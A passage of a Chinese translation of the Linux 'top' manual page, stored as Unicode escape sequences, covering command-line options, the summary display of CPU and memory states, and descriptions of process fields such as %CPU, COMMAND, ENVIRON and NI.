\u72b6\u6001\u53cd\u8f6c\u3002\u5f53\u7d2f\u79ef\u65f6\u95f4\u6a21\u5f0f\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5c06\u5217\u51fa\u5176\u81ea\u8eab\u548c\u5df2\u7ec8\u6b62\u5b50\u8fdb\u7a0b\u4f7f\u7528\u7684 CPU \u65f6\u95f4\u3002 \u6709\u5173\u6b64\u6a21\u5f0f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `S` \u4ea4\u4e92\u547d\u4ee4\u3002 -u | -U :\u7528\u6237\u8fc7\u6ee4\u6a21\u5f0f\uff1a-u | -U \u7528\u6237ID\u6216\u540d\u79f0 \u4ec5\u663e\u793a\u5177\u6709\u7ed9\u5b9a\u7528\u6237ID\u6216\u7528\u6237\u540d\u7684\u8fdb\u7a0b\u3002`-u` \u9009\u9879\u5339\u914d\u6709\u6548\u7528\u6237\uff0c\u800c `-U` \u9009\u9879\u5339\u914d\u4efb\u4f55\u7528\u6237\uff08\u5b9e\u9645\u3001\u6709\u6548\u3001\u4fdd\u5b58\u6216\u6587\u4ef6\u7cfb\u7edf\uff09\u3002 \u5728\u7528\u6237ID\u6216\u540d\u79f0\u524d\u52a0\u4e0a\u611f\u53f9\u53f7\uff08`!`\uff09\u6307\u793a top \u4ec5\u663e\u793a\u4e0d\u5339\u914d\u63d0\u4f9b\u7684\u7528\u6237\u7684\u8fdb\u7a0b\u3002 `p`\u3001`u` \u548c `U` \u547d\u4ee4\u884c\u9009\u9879\u662f\u4e92\u65a5\u7684\u3002 -w :\u8f93\u51fa\u5bbd\u5ea6\u8986\u76d6\uff1a-w [\u6570\u5b57] \u5728\u6279\u5904\u7406\u6a21\u5f0f\u4e0b\uff0c\u5f53\u4e0d\u5e26\u53c2\u6570\u4f7f\u7528\u65f6\uff0ctop \u5c06\u4f7f\u7528\u8bbe\u7f6e\u7684 COLUMNS= \u548c LINES= \u73af\u5883\u53d8\u91cf\u683c\u5f0f\u5316\u8f93\u51fa\u3002\u5426\u5219\uff0c\u5bbd\u5ea6\u5c06\u56fa\u5b9a\u4e3a\u6700\u5927 512 \u5217\u3002 \u5e26\u53c2\u6570\u65f6\uff0c\u8f93\u51fa\u5bbd\u5ea6\u53ef\u4ee5\u51cf\u5c11\u6216\u589e\u52a0\uff08\u6700\u591a 512\uff09\uff0c\u4f46\u884c\u6570\u88ab\u8ba4\u4e3a\u662f\u65e0\u9650\u7684\u3002 \u5728\u6b63\u5e38\u663e\u793a\u6a21\u5f0f\u4e0b\uff0c\u5f53\u4e0d\u5e26\u53c2\u6570\u4f7f\u7528\u65f6\uff0ctop \u5c06\u5c1d\u8bd5\u4f7f\u7528\u8bbe\u7f6e\u7684 COLUMNS= \u548c LINES= \u73af\u5883\u53d8\u91cf\u683c\u5f0f\u5316\u8f93\u51fa\u3002 \u5e26\u53c2\u6570\u65f6\uff0c\u8f93\u51fa\u5bbd\u5ea6\u53ea\u80fd\u51cf\u5c11\uff0c\u4e0d\u80fd\u589e\u52a0\u3002\u65e0\u8bba\u662f\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u8fd8\u662f\u5e26\u53c2\u6570\u7684 -w\uff0c\u5f53\u4e0d\u5728\u6279\u5904\u7406\u6a21\u5f0f\u4e0b\u65f6\uff0c\u5b9e\u9645\u7ec8\u7aef\u5c3a\u5bf8\u6c38\u8fdc\u4e0d\u4f1a\u88ab\u8d85\u8fc7\u3002 \u6ce8\u610f\uff1a\u4e0d\u4f7f\u7528\u6b64\u547d\u4ee4\u884c\u9009\u9879\uff0c\u8f93\u51fa\u5bbd\u5ea6\u59cb\u7ec8\u57fa\u4e8e\u8c03\u7528 top \u65f6\u7684\u7ec8\u7aef\uff0c\u65e0\u8bba\u662f\u5426\u5728\u6279\u5904\u7406\u6a21\u5f0f\u4e0b\u3002 -1 :\u5355/\u591a CPU \u72b6\u6001\u5207\u6362 \u542f\u52a8 top \u65f6\uff0c\u6700\u540e\u8bb0\u4f4f\u7684 CPU \u72b6\u6001\u90e8\u5206\u7684\u72b6\u6001\u53cd\u8f6c\u3002\u8981\u4e48\u5728\u4e00\u884c\u4e2d\u663e\u793a\u6240\u6709 CPU \u4fe1\u606f\uff0c\u8981\u4e48\u5206\u522b\u663e\u793a\u6bcf\u4e2a CPU\uff0c \u8fd9\u53d6\u51b3\u4e8e NUMA \u8282\u70b9\u547d\u4ee4\u5207\u6362\uff08'2'\uff09\u7684\u72b6\u6001\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `1` \u548c `2` \u4ea4\u4e92\u547d\u4ee4\u3002 2. \u6982\u8981\u663e\u793a \u4ee5\u4e0b\u4e09\u4e2a\u533a\u57df\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u901a\u8fc7\u4e00\u4e2a\u6216\u591a\u4e2a\u4ea4\u4e92\u547d\u4ee4\u5355\u72ec\u63a7\u5236\u3002\u6709\u5173\u8fd9\u4e9b\u89c4\u5b9a\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4b. \u6982\u8981\u533a\u57df\u547d\u4ee4\u3002 2a. \u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u548c\u8d1f\u8f7d\u5e73\u5747\u503c \u8fd9\u4e00\u90e8\u5206\u7531\u5355\u884c\u7ec4\u6210\uff0c\u5305\u542b\uff1a \u7a0b\u5e8f\u6216\u7a97\u53e3\u540d\u79f0\uff0c\u53d6\u51b3\u4e8e\u663e\u793a\u6a21\u5f0f \u5f53\u524d\u65f6\u95f4\u548c\u81ea\u4e0a\u6b21\u542f\u52a8\u4ee5\u6765\u7684\u8fd0\u884c\u65f6\u95f4 \u603b\u7528\u6237\u6570 \u7cfb\u7edf\u5728\u8fc7\u53bb 1\u30015 \u548c 15 \u5206\u949f\u5185\u7684\u8d1f\u8f7d\u5e73\u5747\u503c 2b. \u4efb\u52a1\u548c CPU \u72b6\u6001 \u8fd9\u4e00\u90e8\u5206\u81f3\u5c11\u7531\u4e24\u884c\u7ec4\u6210\u3002\u5728\u591a\u5904\u7406\u5668\u73af\u5883\u4e2d\uff0c\u9644\u52a0\u884c\u53ef\u4ee5\u53cd\u6620\u5355\u4e2a CPU \u72b6\u6001\u767e\u5206\u6bd4\u3002 \u7b2c1\u884c\u663e\u793a\u603b\u4efb\u52a1\u6216\u7ebf\u7a0b\u6570\uff0c\u53d6\u51b3\u4e8e\u7ebf\u7a0b\u6a21\u5f0f\u5207\u6362\u7684\u72b6\u6001\u3002\u603b\u6570\u8fdb\u4e00\u6b65\u5206\u7c7b\u4e3a\uff1a \u8fd0\u884c\u4e2d\uff1b\u7761\u7720\u4e2d\uff1b\u505c\u6b62\uff1b\u50f5\u5c38 \u7b2c2\u884c\u663e\u793a\u57fa\u4e8e\u4e0a\u6b21\u5237\u65b0\u4ee5\u6765\u7684\u95f4\u9694\u7684 CPU \u72b6\u6001\u767e\u5206\u6bd4\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u4e0b\u5404\u7c7b\u522b\u7684\u767e\u5206\u6bd4\u5c06\u663e\u793a\u3002\u4e0b\u65b9\u663e\u793a\u4e86\u65b0\u5185\u6838\u7248\u672c\u4e2d\u7684\u4e24\u4e2a\u6807\u7b7e\u3002 us, \u7528\u6237 : \u8fd0\u884c\u975e\u4f18\u5148\u7528\u6237\u8fdb\u7a0b\u7684\u65f6\u95f4 sy, \u7cfb\u7edf : \u8fd0\u884c\u5185\u6838\u8fdb\u7a0b\u7684\u65f6\u95f4 ni, \u4f18\u5148 : \u8fd0\u884c\u4f18\u5148\u7528\u6237\u8fdb\u7a0b\u7684\u65f6\u95f4 id, \u7a7a\u95f2 : \u5728\u5185\u6838\u7a7a\u95f2\u5904\u7406\u7a0b\u5e8f\u4e2d\u82b1\u8d39\u7684\u65f6\u95f4 wa, IO\u7b49\u5f85 : \u7b49\u5f85 I/O \u5b8c\u6210\u7684\u65f6\u95f4 hi : \u670d\u52a1\u786c\u4ef6\u4e2d\u65ad\u7684\u65f6\u95f4 si : \u670d\u52a1\u8f6f\u4ef6\u4e2d\u65ad\u7684\u65f6\u95f4 st : \u88ab\u865a\u62df\u673a\u7ba1\u7406\u7a0b\u5e8f\u7a83\u53d6\u7684\u65f6\u95f4 \u5728\u66ff\u4ee3 CPU \u72b6\u6001\u663e\u793a\u6a21\u5f0f\u4e0b\uff0c\u9664\u4e86\u7b2c\u4e00\u4efb\u52a1/\u7ebf\u7a0b\u884c\u4e4b\u5916\uff0c\u8fd8\u4f1a\u663e\u793a\u4e00\u4e2a\u7b80\u77ed\u7684\u6458\u8981\uff0c\u5305\u62ec\u4ee5\u4e0b\u5143\u7d20\uff1a a b c d %Cpu(s): 75.0/25.0 100[ ... \u5176\u4e2d\uff1aa) \u662f\u201c\u7528\u6237\u201d\uff08us + ni\uff09\u767e\u5206\u6bd4\uff1bb) \u662f\u201c\u7cfb\u7edf\u201d\uff08sy + hi + si\uff09\u767e\u5206\u6bd4\uff1bc) \u662f\u603b\u8ba1\uff1bd) \u662f\u8fd9\u4e9b\u8868\u793a\u7684\u4e00\u79cd\u89c6\u89c9\u56fe\u5f62\u3002 \u6709\u5173\u6b64\u7279\u6b8a\u56db\u5411\u5207\u6362\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4b. \u6982\u8981\u533a\u57df\u547d\u4ee4\u548c `t` \u547d\u4ee4\u3002 2c. \u5185\u5b58\u4f7f\u7528 \u8fd9\u4e00\u90e8\u5206\u7531\u4e24\u884c\u7ec4\u6210\uff0c\u53ef\u4ee5\u6839\u636e `E` \u4ea4\u4e92\u547d\u4ee4\u5f3a\u5236\u7684\u7f29\u653e\u56e0\u5b50\uff0c\u4ee5\u5343\u5b57\u8282\uff08KiB\uff09\u5230\u827e\u5b57\u8282\uff08EiB\uff09\u8868\u793a\u503c\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7b2c1\u884c\u53cd\u6620\u7269\u7406\u5185\u5b58\uff0c\u5206\u7c7b\u4e3a\uff1a \u603b\u8ba1\uff0c\u7a7a\u95f2\uff0c\u5df2\u7528\u548c\u7f13\u51b2/\u7f13\u5b58 \u7b2c2\u884c\u4e3b\u8981\u53cd\u6620\u865a\u62df\u5185\u5b58\uff0c\u5206\u7c7b\u4e3a\uff1a \u603b\u8ba1\uff0c\u7a7a\u95f2\uff0c\u5df2\u7528\u548c\u53ef\u7528\uff08\u5373\u7269\u7406\u5185\u5b58\uff09 \u7b2c2\u884c\u4e2d\u7684 avail \u6570\u503c\u662f\u5bf9\u542f\u52a8\u65b0\u5e94\u7528\u7a0b\u5e8f\u7684\u7269\u7406\u5185\u5b58\u7684\u4f30\u8ba1\uff0c\u65e0\u9700\u4ea4\u6362\u3002\u4e0e free \u5b57\u6bb5\u4e0d\u540c\uff0c\u5b83\u8bd5\u56fe\u8003\u8651\u6613\u56de\u6536\u7684\u9875\u9762\u7f13\u5b58\u548c\u5185\u5b58\u677f\u6761\u3002 \u5728\u5185\u6838 3.14 \u4e0a\u53ef\u7528\uff0c\u5728\u5185\u6838 2.6.27+ \u4e0a\u6a21\u62df\uff0c\u5426\u5219\u4e0e free \u76f8\u540c\u3002 \u5728\u66ff\u4ee3\u5185\u5b58\u663e\u793a\u6a21\u5f0f\u4e0b\uff0c\u4f1a\u663e\u793a\u4e24\u884c\u7b80\u77ed\u7684\u6458\u8981\uff0c\u5305\u62ec\u4ee5\u4e0b\u5143\u7d20\uff1a a b c GiB Mem : 18.7/15.738 [ ... GiB Swap: 0.0/7.999 [ ... \u5176\u4e2d\uff1aa) \u662f\u5df2\u7528\u767e\u5206\u6bd4\uff1bb) \u662f\u603b\u53ef\u7528\u91cf\uff1bc) \u662f\u8fd9\u4e9b\u8868\u793a\u7684\u4e00\u79cd\u89c6\u89c9\u56fe\u5f62\u3002 \u5bf9\u4e8e\u7269\u7406\u5185\u5b58\uff0c\u767e\u5206\u6bd4\u8868\u793a\u603b\u91cf\u51cf\u53bb\u4e0a\u8ff0\u4f30\u8ba1\u7684 avail\u3002'Mem' \u56fe\u672c\u8eab\u5206\u4e3a\u5df2\u7528\u548c\u672a\u88ab avail \u8003\u8651\u7684\u5269\u4f59\u5185\u5b58\u3002 \u6709\u5173\u6b64\u7279\u6b8a\u56db\u5411\u5207\u6362\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4b. \u6982\u8981\u533a\u57df\u547d\u4ee4\u548c `m` \u547d\u4ee4\u3002 \u6b64\u8868\u53ef\u80fd\u6709\u52a9\u4e8e\u89e3\u91ca\u663e\u793a\u7684\u7f29\u653e\u503c\uff1a KiB = \u5343\u5b57\u8282 = 1024 \u5b57\u8282 MiB = \u5146\u5b57\u8282 = 1024 KiB = 1,048,576 \u5b57\u8282 GiB = \u5409\u5b57\u8282 = 1024 MiB = 1,073,741,824 \u5b57\u8282 TiB = \u592a\u5b57\u8282 = 1024 GiB = 1,099,511,627,776 \u5b57\u8282 PiB = \u62cd\u5b57\u8282 = 1024 TiB = 1,125,899,906,842,624 \u5b57\u8282 EiB = \u827e\u5b57\u8282 = 1024 PiB = 1,152,921,504,606,846,976 \u5b57\u8282 3. \u5b57\u6bb5 / \u5217\u663e\u793a 3a. \u5b57\u6bb5\u63cf\u8ff0 \u4e0b\u65b9\u5217\u51fa\u7684\u662f top \u53ef\u7528\u7684\u8fdb\u7a0b\u5b57\u6bb5\uff08\u5217\uff09\u3002\u5b83\u4eec\u6309\u4e25\u683c\u7684 ASCII \u5b57\u6bcd\u987a\u5e8f\u663e\u793a\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 `f` \u6216 `F` \uff08\u5b57\u6bb5\u7ba1\u7406\uff09\u4ea4\u4e92\u547d\u4ee4\u81ea\u5b9a\u4e49\u5b83\u4eec\u7684\u4f4d\u7f6e\u4ee5\u53ca\u5b83\u4eec\u662f\u5426\u663e\u793a\u3002 \u4efb\u4f55\u5b57\u6bb5\u90fd\u53ef\u4ee5\u9009\u62e9\u4f5c\u4e3a\u6392\u5e8f\u5b57\u6bb5\uff0c\u5e76\u4e14\u4f60\u53ef\u4ee5\u63a7\u5236\u5b83\u4eec\u662f\u6309\u9ad8\u5230\u4f4e\u8fd8\u662f\u4f4e\u5230\u9ad8\u6392\u5e8f\u3002\u6709\u5173\u6392\u5e8f\u89c4\u5b9a\u7684\u66f4\u591a\u4fe1\u606f\uff0c \u8bf7\u53c2\u89c1\u4e3b\u9898 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4\uff0c\u6392\u5e8f\u3002 \u4e0e\u7269\u7406\u5185\u5b58\u6216\u865a\u62df\u5185\u5b58\u76f8\u5173\u7684\u5b57\u6bb5\u5f15\u7528 `(KiB)`\uff0c\u8fd9\u662f\u672a\u52a0\u540e\u7f00\u7684\u663e\u793a\u6a21\u5f0f\u3002\u7136\u800c\uff0c\u8fd9\u4e9b\u5b57\u6bb5\u53ef\u4ee5\u6309 KiB \u5230 PiB \u7f29\u653e\u3002 \u8fd9\u79cd\u7f29\u653e\u53d7 `e` \u4ea4\u4e92\u547d\u4ee4\u7684\u5f71\u54cd\u6216\u901a\u8fc7\u6784\u5efa\u9009\u9879\u4e3a\u542f\u52a8\u5efa\u7acb\u3002 1. %CPU -- CPU \u4f7f\u7528\u7387 \u81ea\u4e0a\u6b21\u5c4f\u5e55\u66f4\u65b0\u4ee5\u6765\u4efb\u52a1\u5360\u7528\u7684 CPU \u65f6\u95f4\u4efd\u989d\uff0c\u4ee5\u603b CPU \u65f6\u95f4\u7684\u767e\u5206\u6bd4\u8868\u793a\u3002 \u5728\u771f\u6b63\u7684 SMP \u73af\u5883\u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u662f\u591a\u7ebf\u7a0b\u7684\u5e76\u4e14 top \u672a\u5728\u7ebf\u7a0b\u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u62a5\u544a\u7684\u503c\u53ef\u80fd\u8d85\u8fc7 100%\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 `H` \u4ea4\u4e92\u547d\u4ee4\u5207\u6362\u7ebf\u7a0b\u6a21\u5f0f\u3002 \u540c\u6837\u5bf9\u4e8e\u591a\u5904\u7406\u5668\u73af\u5883\uff0c\u5982\u679c Irix \u6a21\u5f0f\u5173\u95ed\uff0ctop \u5c06\u5728 Solaris \u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u5176\u4e2d\u4efb\u52a1\u7684 CPU \u4f7f\u7528\u91cf\u5c06\u9664\u4ee5 CPU \u603b\u6570\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 `I` \u4ea4\u4e92\u547d\u4ee4\u5207\u6362 Irix/Solaris \u6a21\u5f0f\u3002 \u6ce8\u610f\uff1a\u5f53\u4ee5\u6811\u72b6\u89c6\u56fe\u6a21\u5f0f\u8fd0\u884c\uff08`V`\uff09\u4e14\u5b50\u8fdb\u7a0b\u6298\u53e0\uff08`v`\uff09\u65f6\uff0c\u6b64\u5b57\u6bb5\u8fd8\u5c06\u5305\u62ec\u90a3\u4e9b\u672a\u89c1\u5b50\u8fdb\u7a0b\u7684 CPU \u65f6\u95f4\u3002 \u6709\u5173 `V` \u548c `v` \u5207\u6362\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4\uff0c\u5185\u5bb9\u3002 2. %MEM -- \u5185\u5b58\u4f7f\u7528\u7387\uff08RES\uff09 \u4efb\u52a1\u5f53\u524d\u9a7b\u7559\u7684\u53ef\u7528\u7269\u7406\u5185\u5b58\u4efd\u989d\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 3. CGNAME -- \u63a7\u5236\u7ec4\u540d\u79f0 \u8fdb\u7a0b\u6240\u5c5e\u7684\u63a7\u5236\u7ec4\u540d\u79f0\uff0c\u5982\u679c\u4e0d\u9002\u7528\uff0c\u5219\u4e3a `-`\u3002 \u8fd9\u901a\u5e38\u662f\u4e0b\u4e00\u6807\u9898\uff08CGROUPS\uff09\u4e2d\u663e\u793a\u7684\u63a7\u5236\u7ec4\u5217\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u6761\u76ee\u3002\u4e0e\u6b64\u5904\u7684\u60c5\u51b5\u4e00\u6837\uff0c\u6b64\u5b57\u6bb5\u4e5f\u662f\u53ef\u53d8\u5bbd\u5ea6\u7684\u3002 4. CGROUPS -- \u63a7\u5236\u7ec4 \u8fdb\u7a0b\u6240\u5c5e\u7684\u63a7\u5236\u7ec4\u540d\u79f0\uff0c\u5982\u679c\u4e0d\u9002\u7528\uff0c\u5219\u4e3a `-`\u3002 \u63a7\u5236\u7ec4\u63d0\u4f9b\u5728\u5b89\u88c5\u5b9a\u4e49\u7684\u8fdb\u7a0b\u7ec4\u4e4b\u95f4\u5206\u914d\u8d44\u6e90\uff08CPU\u3001\u5185\u5b58\u3001\u7f51\u7edc\u5e26\u5bbd\u7b49\uff09\u7684\u80fd\u529b\u3002\u5b83\u4eec\u4f7f\u5f97\u80fd\u591f\u7cbe\u7ec6\u63a7\u5236\u5206\u914d\u3001\u62d2\u7edd\u3001\u4f18\u5148\u7ea7\u3001 \u7ba1\u7406\u548c\u76d1\u63a7\u8fd9\u4e9b\u8d44\u6e90\u3002 \u7cfb\u7edf\u4e0a\u53ef\u4ee5\u540c\u65f6\u5b58\u5728\u8bb8\u591a\u4e0d\u540c\u5c42\u6b21\u7684\u63a7\u5236\u7ec4\uff0c\u6bcf\u4e2a\u5c42\u6b21\u9644\u52a0\u5230\u4e00\u4e2a\u6216\u591a\u4e2a\u5b50\u7cfb\u7edf\u3002\u5b50\u7cfb\u7edf\u4ee3\u8868\u5355\u4e2a\u8d44\u6e90\u3002 \u6ce8\u610f\uff1aCGROUPS \u5b57\u6bb5\u4e0e\u5927\u591a\u6570\u5217\u4e0d\u540c\uff0c\u4e0d\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\u3002\u5f53\u663e\u793a\u65f6\uff0c\u5b83\u52a0\u4e0a\u4efb\u4f55\u5176\u4ed6\u53ef\u53d8\u5bbd\u5ea6\u5217\u5c06\u5206\u914d\u6240\u6709\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u6700\u591a 512 \u5b57\u7b26\uff09\u3002 \u5373\u4fbf\u5982\u6b64\uff0c\u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5b57\u6bb5\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\u3002\u6709\u5173\u8bbf\u95ee\u4efb\u4f55\u88ab\u622a\u65ad\u6570\u636e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 5. CODE -- \u4ee3\u7801\u5927\u5c0f\uff08KiB\uff09 \u5f53\u524d\u7528\u4e8e\u53ef\u6267\u884c\u4ee3\u7801\u7684\u7269\u7406\u5185\u5b58\u91cf\uff0c\u4e5f\u79f0\u4e3a\u6587\u672c\u9a7b\u7559\u96c6\u5927\u5c0f\u6216 TRS\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 6. COMMAND -- \u547d\u4ee4\u540d\u79f0\u6216\u547d\u4ee4\u884c \u663e\u793a\u7528\u4e8e\u542f\u52a8\u4efb\u52a1\u7684\u547d\u4ee4\u884c\u6216\u76f8\u5173\u7a0b\u5e8f\u7684\u540d\u79f0\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 `c` \u5207\u6362\u547d\u4ee4\u884c\u548c\u540d\u79f0\uff0c`c` \u65e2\u662f\u547d\u4ee4\u884c\u9009\u9879\u4e5f\u662f\u4ea4\u4e92\u547d\u4ee4\u3002 \u5f53\u4f60\u9009\u62e9\u663e\u793a\u547d\u4ee4\u884c\u65f6\uff0c\u6ca1\u6709\u547d\u4ee4\u884c\u7684\u8fdb\u7a0b\uff08\u5982\u5185\u6838\u7ebf\u7a0b\uff09\u5c06\u4ec5\u663e\u793a\u7a0b\u5e8f\u540d\u79f0\u5728\u62ec\u53f7\u4e2d\uff0c\u5982\u6b64\u793a\u4f8b\u6240\u793a\uff1a [kthreadd] \u6b64\u5b57\u6bb5\u8fd8\u53ef\u80fd\u53d7\u5230\u6811\u72b6\u89c6\u56fe\u663e\u793a\u6a21\u5f0f\u7684\u5f71\u54cd\u3002\u6709\u5173\u6b64\u6a21\u5f0f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `V` \u4ea4\u4e92\u547d\u4ee4\u3002 \u6ce8\u610f\uff1aCOMMAND \u5b57\u6bb5\u4e0e\u5927\u591a\u6570\u5217\u4e0d\u540c\uff0c\u4e0d\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\u3002\u5f53\u663e\u793a\u65f6\uff0c\u5b83 \u52a0\u4e0a\u4efb\u4f55\u5176\u4ed6\u53ef\u53d8\u5bbd\u5ea6\u5217\u5c06\u5206\u914d\u6240\u6709\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u6700\u591a 512 \u5b57\u7b26\uff09\u3002\u5373\u4fbf\u5982\u6b64\uff0c\u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5b57\u6bb5\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\u3002\u5c24\u5176\u662f\u5f53\u663e\u793a\u547d\u4ee4\u884c\u65f6\uff08`c` \u4ea4\u4e92\u547d\u4ee4\uff09\uff0c\u8fd9\u79cd\u60c5\u51b5\u5c24\u5176\u660e\u663e\u3002\u6709\u5173\u8bbf\u95ee\u4efb\u4f55\u88ab\u622a\u65ad\u6570\u636e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 7. DATA -- \u6570\u636e + \u5806\u6808\u5927\u5c0f\uff08KiB\uff09 \u8fdb\u7a0b\u4fdd\u7559\u7684\u79c1\u6709\u5185\u5b58\u91cf\u3002\u4e5f\u79f0\u4e3a\u6570\u636e\u9a7b\u7559\u96c6\uff08DRS\uff09\u3002\u8fd9\u79cd\u5185\u5b58\u53ef\u80fd\u5c1a\u672a\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\uff08RES\uff09\uff0c\u4f46\u5c06\u59cb\u7ec8\u5305\u542b\u5728\u865a\u62df\u5185\u5b58\uff08VIRT\uff09\u4e2d\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 8. ENVIRON -- \u73af\u5883\u53d8\u91cf \u663e\u793a\u5404\u4e2a\u8fdb\u7a0b\u770b\u5230\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\uff08\u5982\u679c\u6709\uff09\u3002\u8fd9\u4e9b\u53d8\u91cf\u5c06\u6309\u5176\u539f\u59cb\u987a\u5e8f\u663e\u793a\uff0c\u800c\u4e0d\u662f\u4f60\u4e60\u60ef\u4e8e\u4f7f\u7528\u672a\u9650\u5b9a `set` \u770b\u5230\u7684\u6392\u5e8f\u987a\u5e8f\u3002 \u6ce8\u610f\uff1aENVIRON \u5b57\u6bb5\u4e0e\u5927\u591a\u6570\u5217\u4e0d\u540c\uff0c\u4e0d\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\u3002\u5f53\u663e\u793a\u65f6\uff0c\u5b83\u52a0\u4e0a\u4efb\u4f55\u5176\u4ed6\u53ef\u53d8\u5bbd\u5ea6\u5217\u5c06\u5206\u914d\u6240\u6709\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u6700\u591a 512 \u5b57\u7b26\uff09\u3002\u5373\u4fbf\u5982\u6b64\uff0c\u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5b57\u6bb5\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\u3002\u6b64\u5b57\u6bb5\u5c24\u5176\u5982\u6b64\u3002\u6709\u5173\u8bbf\u95ee\u4efb\u4f55\u88ab\u622a\u65ad\u6570\u636e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 9. Flags -- \u4efb\u52a1\u6807\u5fd7 \u6b64\u5217\u8868\u793a\u4efb\u52a1\u7684\u5f53\u524d\u8c03\u5ea6\u6807\u5fd7\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\uff0c\u5e76\u4e14\u96f6\u88ab\u6291\u5236\u3002\u8fd9\u4e9b\u6807\u5fd7\u5728 <linux/sched.h> \u4e2d\u6709\u5b98\u65b9\u6587\u6863\u3002 10. GID -- \u7ec4 ID \u6709\u6548\u7ec4 ID\u3002 11. GROUP -- \u7ec4\u540d\u79f0 \u6709\u6548\u7ec4\u540d\u79f0\u3002 12. LXC -- LXC \u5bb9\u5668\u540d\u79f0 \u4efb\u52a1\u8fd0\u884c\u6240\u5728\u7684 LXC \u5bb9\u5668\u7684\u540d\u79f0\u3002\u5982\u679c\u8fdb\u7a0b\u672a\u5728\u5bb9\u5668\u5185\u8fd0\u884c\uff0c\u5219\u663e\u793a\u7834\u6298\u53f7 (`-`)\u3002 13. NI -- \u4f18\u5148\u503c \u4efb\u52a1\u7684\u4f18\u5148\u503c\u3002\u8d1f\u4f18\u5148\u503c\u8868\u793a\u66f4\u9ad8\u4f18\u5148\u7ea7\uff0c\u800c\u6b63\u4f18\u5148\u503c\u8868\u793a\u8f83\u4f4e\u4f18\u5148\u7ea7\u3002\u6b64\u5b57\u6bb5\u4e2d\u7684\u96f6\u4ec5\u8868\u793a\u5728\u786e\u5b9a\u4efb\u52a1\u7684\u8c03\u5ea6\u4f18\u5148\u7ea7\u65f6\u4e0d\u4f1a\u8c03\u6574\u4f18\u5148\u7ea7\u3002 14. NU -- \u6700\u540e\u5df2\u77e5\u7684 NUMA \u8282\u70b9 \u4e00\u4e2a\u6570\u5b57\uff0c\u8868\u793a\u4e0e\u4e0a\u6b21\u4f7f\u7528\u7684\u5904\u7406\u5668\uff08`P`\uff09\u5173\u8054\u7684 NUMA \u8282\u70b9\u3002\u5f53\u663e\u793a -1 \u65f6\uff0c\u8868\u793a NUMA \u4fe1\u606f\u4e0d\u53ef\u7528\u3002 \u6709\u5173 NUMA \u529f\u80fd\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `2` \u548c `3` \u4ea4\u4e92\u547d\u4ee4\uff0c\u8fd9\u4e9b\u547d\u4ee4\u5f71\u54cd\u6458\u8981\u533a\u57df\u3002 15. OOMa -- \u5185\u5b58\u4e0d\u8db3\u8c03\u6574\u56e0\u5b50 \u503c\u7684\u8303\u56f4\u4ece -1000 \u5230 